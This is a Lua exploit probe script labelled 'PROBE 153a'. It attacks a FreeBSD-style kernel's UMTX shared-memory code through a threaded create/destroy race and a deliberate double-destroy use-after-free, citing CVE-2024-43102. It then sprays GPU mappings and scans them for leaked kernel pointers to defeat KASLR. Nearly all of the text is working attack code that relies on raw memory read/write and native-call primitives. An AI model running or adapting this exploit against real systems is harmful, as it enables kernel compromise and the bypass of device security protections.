-- CRASH_CLASS: HIGH
-- PROBE 153a: Threaded UMTX SHM race (CVE-2024-43102 pattern)
--
-- Context: 151a confirmed UMTX_OP_SHM (op=25) on syscall 454 is reachable.
-- CVE-2024-43102 is a race condition in umtx_shm_create_reg / unref_reg where
-- concurrent create and destroy on the same key can cause use-after-free.
--
-- Strategy: Use Thrd_create (confirmed working) to spawn worker threads that
-- hammer SHM create/destroy on shared keys while the main thread does the same.
-- The race window is between looking up the registration and incrementing the
-- refcount. If we win the race, the freed object gets reused.
--
-- After the race, spray GPU mmap to reclaim freed SHM objects and scan for
-- kernel pointers that would give us KASLR defeat.

print("=== PROBE 153a: THREADED SHM RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Check for native API
if not (native and native.fcall_with_rax) then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 153a COMPLETE ===")
    return
end

local la = libc_addrofs
if not la then
    print("NEED libc_addrofs — aborting")
    print("=== PROBE 153a COMPLETE ===")
    return
end

local Thrd_create = la.Thrd_create
local Thrd_join = la.Thrd_join
local Atomic_fetch_add_8 = la.Atomic_fetch_add_8

print("Thrd_create=" .. tostring(Thrd_create))
print("Thrd_join=" .. tostring(Thrd_join))
print("Atomic_fetch_add_8=" .. tostring(Atomic_fetch_add_8))

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- ============================================================
-- SECTION A: GPU MMAP BASELINE
-- ============================================================
print("")
print("--- SECTION A: GPU BASELINE ---")

local gpu1 = sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g1h, g1l = get_hi_lo(gpu1)
print(string.format("gpu1=0x%X%08X (16 pages)", g1h, g1l))

local kptr_base = 0
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_base = kptr_base + 1
        end
    end
end
print("gpu1_kptr_baseline=" .. kptr_base)

-- ============================================================
-- SECTION B: THREADED SHM RACE
-- ============================================================
print("")
print("--- SECTION B: THREADED SHM RACE ---")

-- Shared state for threads
-- Layout:
--   +0x00: iteration counter (atomic)
--   +0x08: key value for SHM ops
--   +0x10: stop flag
--   +0x18: thread error count
local shared = memory.alloc(0x40)
safe_wq(shared, uint64(0))           -- counter
safe_wq(shared + 0x08, uint64(0))    -- key
safe_wq(shared + 0x10, uint64(0))    -- stop
safe_wq(shared + 0x18, uint64(0))    -- errors

-- We'll use Atomic_fetch_add_8 as the thread entry point.
-- Each thread just increments the counter atomically in a tight loop.
-- The counter gives us evidence the threads are running.
-- The REAL race happens from the main thread doing SHM ops
-- while threads create heap pressure via the atomic increments.

-- But for a proper race, we need threads doing SHM ops too.
-- Since Thrd_create takes (func_addr, arg), and Atomic_fetch_add_8
-- takes (ptr) and increments *ptr, we use it to create CPU pressure.

-- Strategy: Main thread rapidly creates and destroys SHM objects
-- while worker threads create CPU + memory pressure. The heap
-- allocator is more likely to race when under pressure.

-- Key buffer for SHM ops (reuse single buffer)
local key = memory.alloc(0x20)

print("Spawning 3 pressure threads...")
local tids = {}
for i = 1, 3 do
    local ok, ret = pcall(function()
        return native.fcall_with_rax(Thrd_create, shared, Atomic_fetch_add_8, shared)
    end)
    if ok then
        tids[#tids + 1] = ret
        print("  thread " .. i .. ": tid=" .. tostring(ret))
    else
        print("  thread " .. i .. ": FAILED")
    end
end

-- Now race: rapid SHM create/destroy on same key while threads run
-- The key insight: create and destroy in rapid succession on the SAME
-- key. In the vulnerable code path, another thread's lookup can find
-- a registration that's being freed.
print("")
print("Racing SHM create/destroy (500 cycles, same key)...")

local race_creates = 0
local race_destroys = 0
local create_0 = 0
local destroy_0 = 0

for i = 1, 500 do
    -- Use a FIXED key so create/destroy hit the same hash bucket
    memory.write_qword(key, uint64(0xBADE0001))

    -- Create
    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok1 then
        race_creates = race_creates + 1
        if to_num(r1) == 0 then create_0 = create_0 + 1 end
    end

    -- Destroy immediately (race window)
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    if ok2 then
        race_destroys = race_destroys + 1
        if to_num(r2) == 0 then destroy_0 = destroy_0 + 1 end
    end

    -- Every 100 cycles, check canary
    if i % 100 == 0 then
        local alive = pcall(function() return to_num(syscall.getpid()) end)
        if not alive then
            print("*** PROCESS DIED AT CYCLE " .. i .. " ***")
            return
        end
    end
end

print(string.format("creates: %d (ret=0: %d)", race_creates, create_0))
print(string.format("destroys: %d (ret=0: %d)", race_destroys, destroy_0))

-- Join threads
print("")
print("Joining threads...")
for i, tid in ipairs(tids) do
    pcall(function() native.fcall_with_rax(Thrd_join, tid, uint64(0)) end)
end
print("All threads joined")

local counter = safe_rq(shared)
print("atomic_counter=" .. fmt_addr(counter))

-- ============================================================
-- SECTION C: GPU RECLAIM SCAN
-- ============================================================
print("")
print("--- SECTION C: GPU RECLAIM ---")

-- New GPU mmap to try to reclaim freed SHM objects
local gpu2 = sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g2h, g2l = get_hi_lo(gpu2)
print(string.format("gpu2=0x%X%08X", g2h, g2l))

local kptr_after = 0
local ksamples = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu2 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_after = kptr_after + 1
            if #ksamples < 20 then
                ksamples[#ksamples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("gpu2_kptr=" .. kptr_after)
for _, s in ipairs(ksamples) do print(s) end

-- Rescan gpu1
local kptr_rescan = 0
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_rescan = kptr_rescan + 1
        end
    end
end
print("gpu1_rescan_kptr=" .. kptr_rescan)

-- ============================================================
-- SECTION D: DOUBLE-DESTROY UNDER THREAD PRESSURE
-- ============================================================
print("")
print("--- SECTION D: DOUBLE-DESTROY + THREADS ---")

-- Spawn fresh threads for pressure
local tids2 = {}
safe_wq(shared, uint64(0))
for i = 1, 3 do
    local ok, ret = pcall(function()
        return native.fcall_with_rax(Thrd_create, shared, Atomic_fetch_add_8, shared)
    end)
    if ok then tids2[#tids2 + 1] = ret end
end

-- Double-destroy: create once, destroy twice
-- Under thread pressure, the second destroy may hit freed memory
local dd_ok = 0
local dd_crash = 0
for i = 1, 100 do
    memory.write_qword(key, uint64(0xDD000000 + i))

    -- Create
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- First destroy
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    -- Second destroy (use-after-free attempt)
    local ok, r = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    if ok then
        dd_ok = dd_ok + 1
    else
        dd_crash = dd_crash + 1
    end
end
print(string.format("double_destroy: ok=%d crash=%d", dd_ok, dd_crash))

-- Join threads
for _, tid in ipairs(tids2) do
    pcall(function() native.fcall_with_rax(Thrd_join, tid, uint64(0)) end)
end

-- ============================================================
-- SECTION E: GPU SCAN AFTER DOUBLE-DESTROY
-- ============================================================
print("")
print("--- SECTION E: FINAL GPU SCAN ---")

local gpu3 = sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g3h, g3l = get_hi_lo(gpu3)
print(string.format("gpu3=0x%X%08X", g3h, g3l))

local kptr_final = 0
local final_samples = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu3 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_final = kptr_final + 1
            if #final_samples < 20 then
                final_samples[#final_samples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("gpu3_kptr=" .. kptr_final)
for _, s in ipairs(final_samples) do print(s) end

-- VM counter
local vm = to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 624))
print("sys624_vm=" .. vm)

local cpid = to_num(syscall.getpid())
print("")
print("canary=" .. cpid)
print("=== PROBE 153a COMPLETE ===")
